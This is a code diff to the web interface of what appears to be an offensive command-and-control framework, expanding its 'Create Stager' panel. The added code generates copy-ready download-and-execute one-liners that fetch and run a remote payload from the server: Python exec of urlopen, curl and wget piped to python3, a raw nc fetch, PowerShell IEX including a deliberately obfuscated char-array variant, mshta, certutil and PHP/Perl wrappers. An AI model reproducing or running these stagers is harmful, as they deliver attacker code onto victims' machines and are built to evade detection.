@@ -132,8 +132,11 @@
 
 <!-- Stager Modal -->
 <div class="modal-overlay" id="stager-modal">
-  <div class="modal" style="max-width:560px;width:95vw">
-    <h2 data-i18n="stager_title">🎣 Create Stager</h2>
+  <div class="modal" style="max-width:820px;width:95vw;max-height:90vh;overflow-y:auto">
+    <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px">
+      <h2 style="margin:0" data-i18n="stager_title">🎣 Create Stager</h2>
+      <button class="btn btn-sm btn-ghost" onclick="closeStagerModal()" style="font-size:16px;padding:2px 8px;line-height:1">✕</button>
+    </div>
     <div class="error-msg" id="stager-error"></div>
 
     <!-- Create form -->
@@ -5551,34 +5554,7 @@ async function createStager() {
     return;
   }
   const data = await resp.json();
-  const token = data.token;
-  const base = window.location.origin;
-  const url = `${base}/s/${token}`;
-
-  const oneliners = [
-    { label: 'Python', cmd: `python3 -c "import urllib.request,tempfile,os,sys; exec(compile(urllib.request.urlopen('${url}').read(), '<stager>', 'exec'))"` },
-    { label: 'Bash', cmd: `curl -s "${url}" | python3` },
-    { label: 'PowerShell', cmd: `IEX(New-Object Net.WebClient).DownloadString('${url}')` },
-  ];
-
-  const listEl = document.getElementById('stager-oneliner-list');
-  listEl.innerHTML = oneliners.map((ol, i) => `
-    <div style="margin-bottom:10px">
-      <div style="color:var(--text3);font-size:10px;text-transform:uppercase;letter-spacing:.5px;margin-bottom:4px">${ol.label}</div>
-      <div style="display:flex;gap:6px;align-items:flex-start">
-        <code style="flex:1;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:7px 10px;font-size:10px;word-break:break-all;color:var(--accent2)">${ol.cmd}</code>
-        <button class="btn btn-sm btn-ghost" style="flex-shrink:0;font-size:10px" data-stager-idx="${i}">⎘ Copy</button>
-      </div>
-    </div>
-  `).join('');
-  // Attach copy handlers via data attribute to avoid HTML escaping issues
-  listEl.querySelectorAll('[data-stager-idx]').forEach(btn => {
-    const idx = parseInt(btn.dataset.stagerIdx);
-    btn.addEventListener('click', () => _stagerCopyLine(btn, oneliners[idx].cmd));
-  });
-
-  document.getElementById('stager-form').style.display = 'none';
-  document.getElementById('stager-oneliners').style.display = '';
+  _stagerShowOneliners(data.token);
   _loadStagerList();
 }
 
@@ -5603,17 +5579,108 @@ async function _loadStagerList() {
   }
   listEl.innerHTML = items.map(st => {
     const statusColor = st.active ? 'var(--green)' : 'var(--text3)';
-    const statusLabel = st.active ? (LANG[_lang]?.stager_active || 'active') : (LANG[_lang]?.stager_expired || 'expired');
     const usesLabel = st.max_uses > 0 ? `${st.used_count}/${st.max_uses}` : `${st.used_count}`;
     const expiresLabel = st.expires_at ? new Date(st.expires_at).toLocaleDateString() : (LANG[_lang]?.stager_never || 'never');
-    return `<div style="display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border)">
+    const rowStyle = st.active
+      ? 'display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);cursor:pointer;border-radius:4px;transition:background .15s'
+      : 'display:flex;align-items:center;gap:8px;padding:5px 0;border-bottom:1px solid var(--border);opacity:.5';
+    return `<div style="${rowStyle}" ${st.active ? `data-stager-token="${st.token}" onmouseenter="this.style.background='var(--bg3)'" onmouseleave="this.style.background=''"` : ''}>
       <span style="color:${statusColor};font-size:9px">●</span>
       <code style="color:var(--accent2);flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${st.token}</code>
       <span style="color:var(--text3);font-size:10px">${usesLabel} ${LANG[_lang]?.stager_uses || 'uses'}</span>
       <span style="color:var(--text3);font-size:10px">exp: ${expiresLabel}</span>
-      <button class="btn btn-sm btn-ghost" style="font-size:10px;color:#ef4444" onclick="_stagerRevoke('${st.token}')">${LANG[_lang]?.stager_revoke || 'Revoke'}</button>
+      ${st.active ? `<span style="color:var(--text3);font-size:10px">📋</span>` : ''}
+      <button class="btn btn-sm btn-ghost" style="font-size:10px;color:#ef4444" data-revoke="${st.token}">${LANG[_lang]?.stager_revoke || 'Revoke'}</button>
     </div>`;
   }).join('');
+
+  // Click on active stager row → show one-liners
+  listEl.querySelectorAll('[data-stager-token]').forEach(row => {
+    row.addEventListener('click', e => {
+      if (e.target.closest('[data-revoke]')) return; // don't trigger on revoke button
+      _stagerShowOneliners(row.dataset.stagerToken);
+    });
+  });
+  // Revoke buttons
+  listEl.querySelectorAll('[data-revoke]').forEach(btn => {
+    btn.addEventListener('click', e => { e.stopPropagation(); _stagerRevoke(btn.dataset.revoke); });
+  });
+}
+
+function _stagerShowOneliners(token) {
+  const base = window.location.origin;
+  const url = `${base}/s/${token}`;
+  const hta_url = `${base}/s/${token}/hta`;
+
+  // PS obfuscation: encode URL as decimal char array
+  const psDec = Array.from(url).map(c => c.charCodeAt(0)).join(',');
+
+  // Parse host and port for nc/raw TCP one-liner
+  const parsed = new URL(url);
+  const ncHost = parsed.hostname;
+  const ncPort = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
+  const ncPath = parsed.pathname;
+
+  const groups = [
+    {
+      title: '🐍 Python',
+      items: [
+        { label: 'python3', cmd: `python3 -c "import urllib.request; exec(compile(urllib.request.urlopen('${url}').read(),'<s>','exec'))"` },
+        { label: 'python (Windows)', cmd: `python -c "import urllib.request; exec(compile(urllib.request.urlopen('${url}').read(),'<s>','exec'))"` },
+      ]
+    },
+    {
+      title: '🐚 Shell / Unix',
+      items: [
+        { label: 'curl',    cmd: `curl -s "${url}" | python3` },
+        { label: 'wget',    cmd: `wget -qO- "${url}" | python3` },
+        { label: 'sh',      cmd: `sh -c "curl -s '${url}' | python3 || wget -qO- '${url}' | python3"` },
+        { label: 'nc (raw TCP)', cmd: `(printf 'GET ${ncPath} HTTP/1.0\\r\\nHost: ${ncHost}\\r\\n\\r\\n'; sleep 1) | nc ${ncHost} ${ncPort} | python3 -c "import sys; d=sys.stdin.buffer.read(); exec(d[d.find(b'\\r\\n\\r\\n')+4:])"` },
+      ]
+    },
+    {
+      title: '🪟 Windows',
+      items: [
+        { label: 'PowerShell',             cmd: `IEX(New-Object Net.WebClient).DownloadString('${url}')` },
+        { label: 'PowerShell (obfuscated)', cmd: `IEX((New-Object Net.WebClient).DownloadString((-join([char[]]@(${psDec})))))` },
+        { label: 'mshta (HTA)',            cmd: `mshta ${hta_url}` },
+        { label: 'certutil + python',      cmd: `certutil -urlcache -split -f "${url}" %TEMP%\\s.py && python %TEMP%\\s.py && del %TEMP%\\s.py` },
+      ]
+    },
+    {
+      title: '🔧 Otros lenguajes',
+      items: [
+        { label: 'PHP',  cmd: `php -r "passthru('curl -s ${url} | python3');"` },
+        { label: 'Perl', cmd: `perl -e "system('curl -s ${url} | python3')"` },
+      ]
+    },
+  ];
+
+  const allItems = groups.flatMap(g => g.items);
+  const listEl = document.getElementById('stager-oneliner-list');
+  listEl.innerHTML = groups.map(g => {
+    const itemsHtml = g.items.map((ol, li) => {
+      const flatIdx = allItems.indexOf(ol);
+      return `<div style="margin-bottom:8px">
+        <div style="color:var(--text3);font-size:10px;margin-bottom:3px">${ol.label}</div>
+        <div style="display:flex;gap:6px;align-items:flex-start">
+          <code style="flex:1;background:var(--bg);border:1px solid var(--border);border-radius:4px;padding:6px 10px;font-size:10px;word-break:break-all;color:var(--accent2)">${ol.cmd}</code>
+          <button class="btn btn-sm btn-ghost" style="flex-shrink:0;font-size:10px" data-stager-idx="${flatIdx}">⎘</button>
+        </div>
+      </div>`;
+    }).join('');
+    return `<div style="margin-bottom:14px">
+      <div style="color:var(--text2);font-size:11px;font-weight:600;margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid var(--border)">${g.title}</div>
+      ${itemsHtml}
+    </div>`;
+  }).join('');
+
+  listEl.querySelectorAll('[data-stager-idx]').forEach(btn => {
+    const i = parseInt(btn.dataset.stagerIdx);
+    btn.addEventListener('click', () => _stagerCopyLine(btn, allItems[i].cmd));
+  });
+  document.getElementById('stager-form').style.display = 'none';
+  document.getElementById('stager-oneliners').style.display = '';
 }
 
 async function _stagerRevoke(token) {
